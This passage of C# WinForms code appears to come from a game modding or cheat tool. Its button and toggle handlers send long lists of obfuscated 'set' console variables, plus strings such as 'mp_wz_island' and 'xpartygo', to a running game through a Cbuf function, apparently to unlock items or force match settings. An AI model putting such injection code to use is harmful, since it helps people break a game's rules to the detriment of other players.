            this.Cbuf("set BDFCGGGAEA 1");
            this.Cbuf("set BHFJEBACDF 1");
            this.Cbuf("set BHHDJIGHED 1");
            this.Cbuf("set IEGJEIHE 1");
            this.Cbuf("set errorString 1");
            this.Cbuf("set CDHIBDHIGD 1");
            this.Cbuf("set DEHJIFFID 1");
            this.Cbuf("set CIJDCFGGHD 1");
            this.Cbuf("set BCCGADID 1");
            this.Cbuf("set FIIDEFBHJ 1");
            this.Cbuf("set DADJEHFJJJ 1");
            this.Cbuf("set JIFHCDAFB 1");
            this.Cbuf("set DDEGJEEJCF 1");
            this.Cbuf("set DHJAFBBDIC 1");
            this.Cbuf("set EAGEGCJIEA 1");
            this.Cbuf("set CAAAFJIFDG 1");
            this.Cbuf("set HIEBFADEC 1");
            this.Cbuf("set CGBEIIAHEH 1");
            this.Cbuf("set DECHFDIAFC 1");
            this.Cbuf("set DIDFDDCCDE 1");
            this.Cbuf("set DAGFFDGFII 1");
            this.Cbuf("set BEDAHJJBFJ 1");
            this.Cbuf("set GCDIBICIF 1");
            this.Cbuf("set DJHABIGCGE 1");
            this.Cbuf("set DFAJCBFIAB 1");
            this.Cbuf("set CAGFAECIIG 1");
            this.Cbuf("set CFAEFGDGFH 1");
            this.Cbuf("set CADIDDHHGH 1");
            this.Cbuf("set IBHIBFEEE 1");
            this.Cbuf("set DHIIBJFHCJ 1");
            this.Cbuf("set DADEEDCCAC 1");
            this.Cbuf("set CHJHJIEBAE 1");
            this.Cbuf("set CBEAHDFCFC 1");
            this.Cbuf("set DDIEJHFAHG 1");
            this.Cbuf("set CDFBEEAADB 1");
            this.Cbuf("set DGJAEHAEIJ 1");
            this.Cbuf("set BIFAAAECJJ 1");
            this.Cbuf("set BHDGCFCBDJ 1");
            this.Cbuf("set CABGDFCIDH 1");
            this.Cbuf("set BCFDGGJGAJ 1");
            this.Cbuf("set DDFHCEDJEA 1");
            this.Cbuf("set CHDJJHJGHH 1");
            this.Cbuf("set DECICJIHF 1");
            this.Cbuf("set EAAHJIGHHI 1");
            this.Cbuf("set CIBBIJJCFB 1");
            this.Cbuf("set CICGDFHGHH 1");
        }

        private void metroButton21_Click(object sender, EventArgs e)
        {
            this.Cbuf("set EEFJJJEHF 1");
            this.Cbuf("set CBAAECBJAJ 1");
            this.Cbuf("set BJDEJDCHJB 1");
            this.Cbuf("set BACCFGEDED 1");
            this.Cbuf("set DBDCFEHABG 1");
            this.Cbuf("set EBCGADABJ 1");
            this.Cbuf("set IEBBJFBE 1");
            this.Cbuf("set CBCJIDDIED 1");
            this.Cbuf("set ECJFFHEID 1");
            this.Cbuf("set EIHIFJBEC 1");
            this.Cbuf("set CFHJCGCIEG 1");
            this.Cbuf("set BBFJAICIBC 1");
            this.Cbuf("set BJGAADIDFH 1");
            this.Cbuf("set CBCEBADAJ 1");
            this.Cbuf("set BCHFJIJGJD 1");
            this.Cbuf("set CHJADGICGJ 1");
            this.Cbuf("set EHAAGBJJI 1");
            this.Cbuf("set CJAECDGCFH 1");
            this.Cbuf("set DJADGEBIBJ 1");
            this.Cbuf("set CIBAFDBCBB 1");
            this.Cbuf("set GBEDAEBIH 1");
            this.Cbuf("set JJFCFBDAA 1");
            this.Cbuf("set GEDACDBIB 1");
            this.Cbuf("set DCFJBGICFF 1");
            this.Cbuf("set DJEEFDHHFB 1");
            this.Cbuf("set BBCBBFHCJJ 1");
            this.Cbuf("set ECDIACHEID 1");
            this.Cbuf("set CGEFDFCIJA 1");
            this.Cbuf("set HEEFCICJE 1");
            this.Cbuf("set GHHBHBFAC 1");
            this.Cbuf("set BGDHBAFGCG 1");
            this.Cbuf("set CIBEABFIJI 1");
            this.Cbuf("set BAJIGJADFI 1");
            this.Cbuf("set ECCHEFFDFD 1");
            this.Cbuf("set DCCFDBGGEE 1");
            this.Cbuf("set CFHBIHABCB 1");
            this.Cbuf("set CGIHIFHGAF 1");
            this.Cbuf("set CIHDHDCIBE 1");
            this.Cbuf("set CJAEBHAHBB 1");
            this.Cbuf("set IJHFCGEBD 1");
            this.Cbuf("set CBGJIDFIDE 1");
        }

        private void metroButton24_Click(object sender, EventArgs e)
        {
            this.Cbuf("set EABFIDADDB 1");
            this.Cbuf("set CJHIJHGAAE 1");
            this.Cbuf("set BCJJBCDGAC 1");
            this.Cbuf("set BBEIIEHECB 1");
            this.Cbuf("set CECAAEJABF 1");
            this.Cbuf("set CIHICIEBIA 1");
            this.Cbuf("set CBGDIBDFHI 1");
            this.Cbuf("set ECFHDAEIDA 1");
            this.Cbuf("set CBAGDDEAFH 1");
            this.Cbuf("set DHCGHHBHCH 1");
            this.Cbuf("set BJIBIJHDFJ 1");
            this.Cbuf("set BJCCHBCCEI 1");
            this.Cbuf("set DEIDGHDBHD 1");
            this.Cbuf("set EBHEBCCBFD 1");
            this.Cbuf("set DBBDFHBBJC 1");
            this.Cbuf("set CAFCFHEFDD 1");
            this.Cbuf("set BEEJICIGEG 1");
            this.Cbuf("set EABHFICBCE 1");
            this.Cbuf("set ECCJEIDDC 1");
            this.Cbuf("set DFDGCIDHJH 1");
            this.Cbuf("set DJADIGFBGI 1");
            this.Cbuf("set CIFCEGIDAI 1");
            this.Cbuf("set BHBDBCEHC 1");
            this.Cbuf("set CBBGEEFIFI 1");
            this.Cbuf("set DGICIJGBGB 1");
            this.Cbuf("set CIIJFDHHC 1");
            this.Cbuf("set CGACCJCHEC 1");
            this.Cbuf("set CCBBGABHEH 1");
            this.Cbuf("set BAADCHEJJD 1");
            this.Cbuf("set EAEJHHHFIC 1");
            this.Cbuf("set CJHDBCCGJE 1");
            this.Cbuf("set JHIAHEEHE 1");
            this.Cbuf("set BADICCBICG 1");
            this.Cbuf("set JEDFGECDJ 1");
            this.Cbuf("set DDIFAGHHAB 1");
            this.Cbuf("set CGFGDJCJHI 1");
            this.Cbuf("set JBIHDJBH 1");
            this.Cbuf("set BBDCAFEGDJ 1");
            this.Cbuf("set JACCCCEDI 1");
            this.Cbuf("set GFCCJDDGH 1");
            this.Cbuf("set ECIAEDEBCF 1");
            this.Cbuf("set BFFHIDFJFG 1");
            this.Cbuf("set FCBFFFCGA 1");
            this.Cbuf("set BIBCHJFBBI 1");
            this.Cbuf("set CACFIACEGH 1");
            this.Cbuf("set BFJBEHGGCH 1");
            this.Cbuf("set DCIAAGBJAG 1");
            this.Cbuf("set ECAFBDGCGI 1");
            this.Cbuf("set DFBCEFIHEJ 1");
            this.Cbuf("set GEHBEDCEC 1");
            this.Cbuf("set BIEGEGDIGH 1");
            this.Cbuf("set CCGEHCIECB 1");
            this.Cbuf("set BGGJFFFAFG 1");
            this.Cbuf("set HBIAGEFCC 1");
            this.Cbuf("set ECFHCCHDGF 1");
            this.Cbuf("set DIIFJGIIBA 1");
            this.Cbuf("set BGBBEIFEDB 1");
            this.Cbuf("set BBHEIABDAC 1");
            this.Cbuf("set DBDFIBEJGI 1");
            this.Cbuf("set BJCFEDEDHA 1");
            this.Cbuf("set DAJIFJIJED 1");
            this.Cbuf("set GCDEFJFHF 1");
            this.Cbuf("set BIIFFHIFCJ 1");
            this.Cbuf("set CDHBFIFCEA 1");
            this.Cbuf("set DAHGHDHFIA 1");
            this.Cbuf("set BFBHHIHIJD 1");
            this.Cbuf("set EABCCIBFIG 1");
            this.Cbuf("set BABHEFFEGI 1");
        }

        private void metroButton25_Click(object sender, EventArgs e)
        {
            this.Cbuf("set BFBFBEHJ 1");
            this.Cbuf("set DEEDAHEFAJ 1");
            this.Cbuf("set BADEEDFGHB 1");
            this.Cbuf("set BCJGJJJCGB 1");
            this.Cbuf("set FJCIBEDII1");
            this.Cbuf("set BFAABIIGDC 1");
            this.Cbuf("set EBEJAAJGDG 1");
            this.Cbuf("set CBEBCGFAIE 1");
            this.Cbuf("set EBEBFEHDFE  1");
            this.Cbuf("set BBHGAFFFGE 1");
            this.Cbuf("set DHFEGHHHFH 1");
            this.Cbuf("set BEGHEGJCJH 1");
            this.Cbuf("set DJHEEAFGDJ 1");
            this.Cbuf("set BBBFBHBDFF 1");
            this.Cbuf("set DCCFJEGGGE 1");
            this.Cbuf("set BJGFGHGFEG 1");
            this.Cbuf("set CDHECDHEDF 1");
            this.Cbuf("set BACIFDBICF 1");
            this.Cbuf("set DIHHGIFAIB 1");
            this.Cbuf("set BDFBGADHAH 1");
            this.Cbuf("set CICDHFEABA 1");
            this.Cbuf("set JJEEDEDHE 1");
        }

        private void metroButton27_Click(object sender, EventArgs e)
        {
            this.Cbuf("set DCCEGJFHJE 1");
            this.Cbuf("set EEGHCCDG 1");
            this.Cbuf("set CCGFGJADDA 1");
            this.Cbuf("set DCGHGJCHIB 1");
            this.Cbuf("set BBHEAJBCHF 1");
            this.Cbuf("set CGCJAJBEGD 1");
            this.Cbuf("set BAJDCAAGCG 1");
            this.Cbuf("set DFJGJCJJID 1");
            this.Cbuf("set ECJDCGHJH 1");
            this.Cbuf("set CHBCJJFDI 1");
            this.Cbuf("set DIHDIGEBJF 1");
            this.Cbuf("set BHBDAJFHGA 1");
            this.Cbuf("set CCDFBBIBIJ 1");
            this.Cbuf("set BHICHBJEHH 1");
            this.Cbuf("set DECFEGAABC 1");
            this.Cbuf("set EAGHDEHDGB 1");
            this.Cbuf("set JGAEIIIGD 1");
            this.Cbuf("set CGDBBICBA 1");
            this.Cbuf("set CDAIIADEJC 1");
            this.Cbuf("set DJEDDFJEIG 1");
            this.Cbuf("set BHIJFFCAEB 1");
            this.Cbuf("set BJFGCHEIEG 1");
            this.Cbuf("set DAAABIJDJI 1");
            this.Cbuf("set DBAEJAHFGJ 1");
            this.Cbuf("set EAEHIJBBCD 1");
            this.Cbuf("set DDEFCIDEJG 1");
            this.Cbuf("set GGIHFEAGD 1");
            this.Cbuf("set BJDBAHBCHD 1");
            this.Cbuf("set CEEFAFFHIE 1");
            this.Cbuf("set DHEJECBEE 1");
            this.Cbuf("set DECIABAAIE 1");
            this.Cbuf("set CHFIIBJFGE 1");
            this.Cbuf("set HDHJDCJGH 1");
            this.Cbuf("set BIDCHDJIC 1");
            this.Cbuf("set CHFHFAIFFG 1");
            this.Cbuf("set BAAGFJBAAE 1");
            this.Cbuf("set BHFFIBEFFH 1");
            this.Cbuf("set BBAEDJDDBA 1");
            this.Cbuf("set CJBJJHJCI 1");
            this.Cbuf("set CCGJCIECBJ 1");
            this.Cbuf("set DGEFGAJIB 1");
            this.Cbuf("set CFJDCHCABD 1");
            this.Cbuf("set BHHGDCDFIE 1");
            this.Cbuf("set CJFHCGJGDI 1");
            this.Cbuf("set DGCGDAJCCI 1");
        }

        private void metroButton28_Click(object sender, EventArgs e)
        {
            this.Cbuf("set DGBECFGFCH 1");
            this.Cbuf("set DDDFIIIDJH 1");
            this.Cbuf("set CAJICHGHDG 1");
            this.Cbuf("set CJJAFGIFAC 1");
            this.Cbuf("set CGJADJICAF 1");
            this.Cbuf("set BGBABIIFGJ 1");
            this.Cbuf("set CCHAIADBGH 1");
            this.Cbuf("set CAFEGAJHHH 1");
            this.Cbuf("set HJGGJEDCD 1");
            this.Cbuf("set HCHEJADDD 1");
            this.Cbuf("set BJDEIGDDCD 1");
            this.Cbuf("set BJGGCHBAGJ 1");
            this.Cbuf("set CGDFDDCIFC 1");
            this.Cbuf("set CAGFEHGHGH 1");
            this.Cbuf("set DAFGFCFHJI 1");
            this.Cbuf("set CECJFAEEEI 1");
            this.Cbuf("set DIDFHBFDFG 1");
            this.Cbuf("set EBCADBGDHB 1");
            this.Cbuf("set BJEGJFBIBI 1");
            this.Cbuf("set DBEJJAFIAI 1");
            this.Cbuf("set BJHACEBBHG 1");
            this.Cbuf("set IIEFBGGGA 1");
            this.Cbuf("set JJAHDCGHI 1");
            this.Cbuf("set BJEAFDBHHJ 1");
            this.Cbuf("set CBGGJIBJBH 1");
            this.Cbuf("set CHJJIAHHGE 1");
            this.Cbuf("set BAGCHIDGCC 1");
            this.Cbuf("set DCICIJEHHH 1");
            this.Cbuf("set CJGIDICGIG 1");
            this.Cbuf("set CIHGCHIBEI 1");
            this.Cbuf("set DHFGJHAADD 1");
            this.Cbuf("set CJFJFEJIJD 1");
            this.Cbuf("set BHEJICHIDE 1");
            this.Cbuf("set DBIIABAEFF 1");
            this.Cbuf("set DFCGEDHBEC 1");
            this.Cbuf("set BAHCIEEBFD 1");
            this.Cbuf("set BJEHICBBEC 1");
            this.Cbuf("set JJCEDCHDD 1");
            this.Cbuf("set EBCBBHIJHJ 1");
            this.Cbuf("set BHCBGBFEJI 1");
            this.Cbuf("set CECBDGIHED 1");
            this.Cbuf("set DEIFCEICHE 1");
            this.Cbuf("set GHGFJIJBI 1");
        }

        private void metroButton29_Click(object sender, EventArgs e)
        {
            this.Cbuf("set CJCEEHHIJE 1");
            this.Cbuf("set CIBAHEBCFJ 1");
            this.Cbuf("set JDFDCGCIJ 1");
            this.Cbuf("set BIJGBJEBIH 1");
            this.Cbuf("set CBBIHFIDFC 1");
            this.Cbuf("set CHHGDHCDB 1");
            this.Cbuf("set DBABFCGGIC 1");
            this.Cbuf("set CIFIBAJFBD 1");
            this.Cbuf("set BJFJDCFDID 1");
            this.Cbuf("set BAJJIAFDH 1");
            this.Cbuf("set DBHBIHJDEC 1");
            this.Cbuf("set HJJJIGAC 1");
            this.Cbuf("set FJIDFHBHB 1");
            this.Cbuf("set DCCCGHJJCJ 1");
            this.Cbuf("set CIGDHFFFEJ 1");
            this.Cbuf("set DAGJJAIBJD 1");
            this.Cbuf("set DABIGBHJDG 1");
            this.Cbuf("set DDHIEBBCI 1");
            this.Cbuf("set DGEFGAJIB 1");
            this.Cbuf("set BJHHJHIEHF 1");
            this.Cbuf("set CDFDBHEFGA 1");
            this.Cbuf("set CHGCJCJFHE 1");
            this.Cbuf("set FIDIEBFAG 1");
            this.Cbuf("set DJDAJEJDE 1");
            this.Cbuf("set CFBFGBECEB 1");
            this.Cbuf("set BJBBEBFBD 1");
            this.Cbuf("set DHGBFGBAIG 1");
            this.Cbuf("set DGECFCHIDD 1");
            this.Cbuf("set CGDHIAECED 1");
            this.Cbuf("set DCHDDCJCEG 1");
            this.Cbuf("set DAJJCCHDFI 1");
            this.Cbuf("set DFIIFBCIH 1");
            this.Cbuf("set BAGCCCCIEF 1");
            this.Cbuf("set CBBGBGBFJF 1");
            this.Cbuf("set CGCBEDDFEC 1");
            this.Cbuf("set DICDEEGJBB 1");
            this.Cbuf("set BBHCDCACGA 1");
            this.Cbuf("set HJCBGFJHE 1");
            this.Cbuf("set ECDECFCHJA 1");
            this.Cbuf("set BAIEJBHIB 1");
            this.Cbuf("set EHEGFJJFB 1");
            this.Cbuf("set GGDCJJGBI 1");
            this.Cbuf("set BJDBIAGIDA 1");
            this.Cbuf("set BAEHCHBBCF 1");
            this.Cbuf("set DIJFAAHDIH 1");
            this.Cbuf("set BHCDIBBGGB 1");
            this.Cbuf("set BHCDIBBGGB 1");
            this.Cbuf("set CADFFHGJAE 1");
            this.Cbuf("set CGJEJFBEAG 1");
            this.Cbuf("set CEEFDAGBGH 1");
            this.Cbuf("set HEIIHIEH 1");
            this.Cbuf("set CHFBFDCHBA 1");
            this.Cbuf("set DFEIGFBEH 1");
            this.Cbuf("set BCABFACBIC 1");
            this.Cbuf("set BFBIDEGDFB 1");
            this.Cbuf("set DJEDHFJFCD 1");
            this.Cbuf("set DFFFDACHD 1");
            this.Cbuf("set CBBFJHCJFB 1");
            this.Cbuf("set CDCBBGFHJA 1");
            this.Cbuf("set DEIEFJJEEJ 1");
            this.Cbuf("set CIHICDGIBJ 1");
            this.Cbuf("set CDFIDGJGHE 1");
            this.Cbuf("set EADFFJDEJI 1");
            this.Cbuf("set CBHCHAFFBG 1");
            this.Cbuf("set CIJIDFCEHD 1");
            this.Cbuf("set CIFGGDIGBE 1");
            this.Cbuf("set EAHBBDJHID 1");
            this.Cbuf("set DDDGAEFCHG 1");
            this.Cbuf("set JCFIBGGJB 1");
        }

        private void metroButton30_Click(object sender, EventArgs e)
        {
            this.Cbuf("set GABIIHIEF 1");
            this.Cbuf("set DGIDFICCJE 1");
            this.Cbuf("set BABEBICCIE 1");
            this.Cbuf("set EAACFJBCIB 1");
            this.Cbuf("set CIEGIACHAE 1");
            this.Cbuf("set FEDEBFDHD 1");
            this.Cbuf("set EBIJHBBHBA 1");
            this.Cbuf("set DCBHGJHBDC 1");
            this.Cbuf("set DHBEJIBCA 1");
            this.Cbuf("set CFJEBEJCFC 1");
        }

        private void guna2ToggleSwitch4_CheckedChanged_4(object sender, EventArgs e)
        {
            this.Cbuf("set NSQLTTMRMP mp_wz_island");
        }

        private void guna2ToggleSwitch5_CheckedChanged_3(object sender, EventArgs e)
        {
            this.Cbuf("xpartygo");
        }

        private void metroButton13_Click(object sender, EventArgs e)
        {
            {
                this.Cbuf("set DGGAFGIEBJ 1");
                this.Cbuf("set DAFDEJICJJ 1");
                this.Cbuf("set EABAJJFIEI 1");
                this.Cbuf("set CFDIIEAGHB 1");
                this.Cbuf("set BEFGJDEHCF 1");
                this.Cbuf("set BDIGHHGJEH 1");
                this.Cbuf("set CBFCCHHHDF 1");
                this.Cbuf("set CEFBABBCGD 1");
                this.Cbuf("set DJBGBJIIF 1");
                this.Cbuf("set ECAJABJEHB 1");
                this.Cbuf("set BCDHJIFIDE 1");
                this.Cbuf("set CCGCCCCEFA 1");
                this.Cbuf("set CEACCICGB 1");
                this.Cbuf("set FGCBBBBBE 1");
                this.Cbuf("set IBJFIGED 1");
                this.Cbuf("set DGAGIABGFJ 1");
                this.Cbuf("set EAIBCCEDBI 1");
                this.Cbuf("set BEDEDEJABJ 1");
                this.Cbuf("set HGFFAFCDI 1");
                this.Cbuf("set DHHEFJGEJC 1");
                this.Cbuf("set DCJHAJAHAH 1");
                this.Cbuf("set CCBFCDCBJG 1");
                this.Cbuf("set DDCFEAFJE 1");
                this.Cbuf("set DCJHJJGCJE 1");
                this.Cbuf("set HHCCBFFJA 1");
                this.Cbuf("set GFIFIGIFH 1");
                this.Cbuf("set BDDBBCDDBJ 1");
                this.Cbuf("set JCCEAHGCE 1");
                this.Cbuf("set DFAIFEFDJI 1");
                this.Cbuf("set DBBFBFCCEA 1");
                this.Cbuf("set DBIBHEAEGD 1");
                this.Cbuf("set BEBCDDEAFJ 1");
                this.Cbuf("set BJJBBBAIJE 1");
                this.Cbuf("set DIJEHAFJDJ 1");
                this.Cbuf("set BIFBICFHID 1");
                this.Cbuf("set EACIEIHFGC 1");
                this.Cbuf("set CACGICCIHI 1");
                this.Cbuf("set BEEEEFDBCD 1");
                this.Cbuf("set DHACEBGICE 1");
                this.Cbuf("set DEEGGAFDHF 1");
                this.Cbuf("set DEHBFHFDFJ 1");
                this.Cbuf("set CJDDHJBCCI 1");
                this.Cbuf("set BIHFEHBCFB 1");
                this.Cbuf("set BIFGHAHJBA 1");
                this.Cbuf("set BJCIIIEBJG 1");
                this.Cbuf("set DJHHBEFCJD 1");
                this.Cbuf("set BJFJBHJAJD 1");
                this.Cbuf("set BBAJACDGI 1");
                this.Cbuf("set BCHHDEJBD 1");
                this.Cbuf("set BCEGDHGFIC 1");
                this.Cbuf("set JIHGCIJCG 1");
                this.Cbuf("set DDEGCFHDCC 1");
                this.Cbuf("set CIGIDJACJB");
                this.Cbuf("set BHEBFGBJDC");
                this.Cbuf("set DHDGADDDII 1");
                this.Cbuf("set HBCJGDEBA 1");
                this.Cbuf("set BFBHGHFAEE 1");
                this.Cbuf("set BGGFEEDBGA 1");
                this.Cbuf("set CCEBJIBHBD 1");
                this.Cbuf("set EAJACAJIHI 1");
                this.Cbuf("set BGAHIDIHH 1");
                this.Cbuf("set DAJJHDCJIF 1");
                this.Cbuf("set BFEDICDJJE 1");
                this.Cbuf("set CAGJIDDHI 1");
                this.Cbuf("set EEIHBFIIF 1");
                this.Cbuf("set DAIBFGCGF 1");
                this.Cbuf("set CCAFGFFCCC 1");
                this.Cbuf("set DIDBJAGCDI 1");
                this.Cbuf("set CHBFFBFCFH 1");
                this.Cbuf("set MQNPRSTSOT 1");
                this.Cbuf("set LSLNSPOTPO 1");
                this.Cbuf("set NNTRLKMQQN 1");
                this.Cbuf("set MMLOTTLSOL 1");
                this.Cbuf("set NKKNOMKOTQ 1");
                this.Cbuf("set LPSPLQQOSQ 1");
                this.Cbuf("set MMOSQRRKLQ 1");
                this.Cbuf("set NPRRMMMNNT 1");
                this.Cbuf("set LLRKRRRQNS 1");
                this.Cbuf("set MNMNQRORPK 1");
                this.Cbuf("set NOOLLMQQRL 1");
                this.Cbuf("set MLSLMMRMOM 1");
                this.Cbuf("set NTSMLKPRSK 1");
                this.Cbuf("set QOMKPKKTP 1");
                this.Cbuf("set SSLLKNRPS 1");
                this.Cbuf("set NKNPQRNMST 1");
                this.Cbuf("set LSLLMKMTSL 1");
                this.Cbuf("set MNSKMSRTTR 1");
                this.Cbuf("set LNPPMKSOOQ 1");
                this.Cbuf("set OMPPOKRRLM 1");
                this.Cbuf("set MKTRNLMQQN 1");
                this.Cbuf("set NRQRORKPLR 1");
                this.Cbuf("set OLPQNPNSSN 1");
                this.Cbuf("set NMQSOPLONQ 1");
                this.Cbuf("set NSROTPMORN 1");
                this.Cbuf("set LKOQOKRKPM 1");
                this.Cbuf("set MLSNOOMMNO 1");

            }
        }

        private void guna2ToggleSwitch4_CheckedChanged_5(object sender, EventArgs e)
        {
            this.Cbuf("set NSQLTTMRMP mp_wz_island; set LSTLQTSSRM 1; xpartygo; ");
        }

        private void CleanerTabPage_Click(object sender, EventArgs e)
        {

        }

        private void metroButton6_Click_3(object sender, EventArgs e)
        {
            this.Cbuf("set HCGJEAAHE 1");
            this.Cbuf("set BBFEJIEGJG 1");
            this.Cbuf("set BBGIFFJJC 1");
            this.Cbuf("set BEEDHHIEGB 1");
            this.Cbuf("set BHEGJFCDAE 1");
            this.Cbuf("set GBGAGGGAH 1");
            this.Cbuf("set BFEBABDDDE 1");
            this.Cbuf("set DFHFDFDDHF 1");
            this.Cbuf("set EBJEBJJFEG 1");
            this.Cbuf("set CCAJIDGI 1");
            this.Cbuf("set CAHAEIIBJJ 1");
            this.Cbuf("set BCDHJBCEGJ 1");
            this.Cbuf("set BFDFCAHCEA 1");
            this.Cbuf("set BAIFHIBCJH 1");
            this.Cbuf("set DHEAIGFEBI 1");
            this.Cbuf("set CJCIEEFHDA 1");
            this.Cbuf("set CCEDAFJIJB 1");
            this.Cbuf("set DBFGBICCJA 1");
            this.Cbuf("set BIGJHBAJEE 1");
            this.Cbuf("set CJABAFIDIG 1");
            this.Cbuf("set BJAACDECGE 1");
            this.Cbuf("set EBCDCJGEJD 1");
            this.Cbuf("set DFAJJBBFGC 1");
            this.Cbuf("set ECHBFGEHFI 1");
            this.Cbuf("set LOTTTLOMOP 1");
            this.Cbuf("set MQQPKORPML 1");
            this.Cbuf("set MSSOQMMMKO 1");
        }

      
       
        private void metroButton5_Click_2(object sender, EventArgs e)
        {
           
            this.Cbuf("set CEBBBFJJEB 1");
            this.Cbuf("set EAAGDGCFFC 1");
            this.Cbuf("set CGJBAEBBG 1");
            this.Cbuf("set CBHGDIGEI 1");
            this.Cbuf("set FAHJDGFJI 1");
            this.Cbuf("set DDIDBIIJIF 1");
            this.Cbuf("set BIAICJCDDH 1");
            this.Cbuf("set BICHEFEAHB 1");
            this.Cbuf("set CCJCFIFHJA 1");
            this.Cbuf("set CAFBGECBDJ 1");
            this.Cbuf("set DEJGAECIBG 1");
            this.Cbuf("set EAIBHEEBAG 1");
            this.Cbuf("set CFADJIBBED 1");
            this.Cbuf("set CBCDIIAFAA 1");
            this.Cbuf("set CJJBCJHBIF 1");
            this.Cbuf("set FDGFJJGG 1");
            this.Cbuf("set IJJJJBEBG 1");
            this.Cbuf("set DCDJEHCDEC 1");
            this.Cbuf("set FCGGCEIGG 1");
            this.Cbuf("set BHDAHAHGDF 1");
            this.Cbuf("set CAFBBGBAI 1");
            this.Cbuf("set DDFHHJEGHI 1");
            this.Cbuf("set IJFGGGBAB 1");
            this.Cbuf("set EBDDCJHAHD 1");
            this.Cbuf("set DBDJAAEGDH 1");
            this.Cbuf("set CAECDIHFCF 1");
            this.Cbuf("set BHJJGDDGFI 1");
            this.Cbuf("set DBHGHFFHFD 1");
            this.Cbuf("set CAGDDGEFAJ 1");
            this.Cbuf("set DCECEDGHEG 1");
            this.Cbuf("set EACGJBFDCA 1");
            this.Cbuf("set DFHIIAGHDG 1");
            this.Cbuf("set FHCIHJDAB 1");
            this.Cbuf("set DGGEBHHGJG 1");
            this.Cbuf("set BFCIBJIIAB 1");
            this.Cbuf("set GHFDEGFFJ 1");
            this.Cbuf("set DDHJHDEHFG 1");
            this.Cbuf("set DJEGBAEGJC 1");
            this.Cbuf("set BCBDGDAHIC 1");
            this.Cbuf("set CJHICGEEFD 1");
            this.Cbuf("set BFFJAJFBDH 1");
            this.Cbuf("set DJJCFGDGGC 1");
            this.Cbuf("set HEEEIDBJE 1");
            this.Cbuf("set BBDICGHE 1");
            this.Cbuf("set DEAABHGCAF 1");
            this.Cbuf("set BJEABAEHDE 1");
            this.Cbuf("set BCIDJGIGEA 1");
            this.Cbuf("set DGHJAEEIHA 1");
            this.Cbuf("set GEHGIJIGB 1");
            this.Cbuf("set CCHEBJJJEB 1");
            this.Cbuf("set IHEAAHBE 1");
            this.Cbuf("set DGAJJAIAEI 1");
            this.Cbuf("set IBGECADJG 1");
            this.Cbuf("set EECACIAFA 1");
            this.Cbuf("set DDIGHAHFEC 1");
            this.Cbuf("set CGEEIHHBAA 1");
            this.Cbuf("set EBFJDJEJJE 1");
            this.Cbuf("set EDCGIHDGA 1");
            this.Cbuf("set BDBGIGDJJG 1");
            this.Cbuf("set DDEDGGBHJ 1");
            this.Cbuf("set GAHGHDBIA 1");
            this.Cbuf("set BCBBBABFFB 1");
            this.Cbuf("set CGAFFFJBCD 1");
            this.Cbuf("set DAFCJHFFAF 1");
            this.Cbuf("set \"GDAFEEGGEBI 1");
            this.Cbuf("set CHEFIDIHJJ 1");
            this.Cbuf("set ECHJIICBFB 1");
            this.Cbuf("set IFHFCECGG 1");
            this.Cbuf("set CEFGJGBAFE 1");
            this.Cbuf("set DCIFGGABIE 1");
            this.Cbuf("set BJCEHCGDJ 1");
            this.Cbuf("set FBEJJEJAD 1");
            this.Cbuf("set BEEAGHBIEE 1");
            this.Cbuf("set CAIAFFIDE 1");
            this.Cbuf("set HFGGACBGJ 1");
            this.Cbuf("set FCHIAFHIG 1");
            this.Cbuf("set BFEEGCHICA 1");
            this.Cbuf("set DEHBFACDFE 1");
            this.Cbuf("set CEDAIJFFD 1");
            this.Cbuf("set BEEEEDBDGG 1");
            this.Cbuf("set CAFGDJBFHB 1");
            this.Cbuf("set DEBJHGADIC 1");
            this.Cbuf("set CFFJEFICCH 1");
            this.Cbuf("set DBIGBIIAA 1");
            this.Cbuf("set DEJIGJBBJA 1");
            this.Cbuf("set EAGGAFAGGB 1");
            this.Cbuf("set GEAJDFCDC 1");
            this.Cbuf("set BCBHHCDEAA 1");
            this.Cbuf("set DAIDIHEAFH 1");
            this.Cbuf("set DIFIJCGFEI 1");
            this.Cbuf("set JDAIJCDEB  1");
            this.Cbuf("set ECIFCJJJIA 1");
            this.Cbuf("set CIFDCFCHFC 1");
            this.Cbuf("set EBEHIFHGD 1");
            this.Cbuf("set CIBJDBAJBI 1");
            this.Cbuf("set DAAFJHIJHA 1");
            this.Cbuf("set CAGCCIEFJE 1");
            this.Cbuf("set DFDBHBFBAC 1");
            this.Cbuf("set DFFJEIIAD 1");
            this.Cbuf("set BAABBJDCJJ 1");
            this.Cbuf("set DEJBCHBCIH 1");
            this.Cbuf("set CFGAGIIBEA 1");
            this.Cbuf("set BAEHBDJCHI 1");
            this.Cbuf("set DHBCIEDCHE 1");
            this.Cbuf("set EBGCIIBJHA 1");
            this.Cbuf("set GAJADCBBI 1");
            this.Cbuf("set CGDBAJECIF 1");
            this.Cbuf("set DHHEJIJDDI 1");
            this.Cbuf("set FABEEFHJC 1");
            this.Cbuf("set HFJFIJBH 1");
            this.Cbuf("set CDBHCFFAID 1");
            this.Cbuf("set DIHADHAAHJ 1");
            this.Cbuf("set BEIFIJACIH 1");
            this.Cbuf("set CFDHHGCCEC 1");
            this.Cbuf("set BAAAGCCFBC 1");
            this.Cbuf("set BCEHDEEHEJ 1");
            this.Cbuf("set CJAFDFCEJJ 1");
            this.Cbuf("set HCCDDJEDE 1");
            this.Cbuf("set CBCBGDBGGB 1");
            this.Cbuf("set BBEEHAIAB 1");
            this.Cbuf("set EBBAABFEBB 1");
            this.Cbuf("set BJBICHGIGD 1");
            this.Cbuf("set ADDCJFFJGDH 1");
            this.Cbuf("set CFAFCEDCJF 1");
            this.Cbuf("set BCGIHJIDIE 1");
            this.Cbuf("set 1638464400 1");
            this.Cbuf("set NTQSRLRPMT 1");
            this.Cbuf("set NOTOORKKTT 1");
            this.Cbuf("set MNSKKLOMMN 1");
            this.Cbuf("set NSONSKLLQQ 1");
            this.Cbuf("set MMMTQPLQMO 1");
            this.Cbuf("set NOPPPNSKMM 1");
            this.Cbuf("set RORLNQQKQ 1");
            this.Cbuf("set MSPTROQNR 1");
            this.Cbuf("set NNRTRKSLKK 1");
            this.Cbuf("set MQRQLLRKOP 1");
            this.Cbuf("set NTMLPPMOPK 1");
            this.Cbuf("set LLSLRMTOKS 1");
            this.Cbuf("set MKMMKPPTL 1");
            this.Cbuf("set MLOKPTMLQP 1");
            this.Cbuf("set OLQKMRLKRN 1");
            this.Cbuf("set MONKPPPQR 1");
            this.Cbuf("set MKKLRTOQTQ 1");
            this.Cbuf("set NKRNRKQPSQ 1");
            this.Cbuf("set MLNNMOPQOP 1");
            this.Cbuf("set NONPSKRPRR 1");
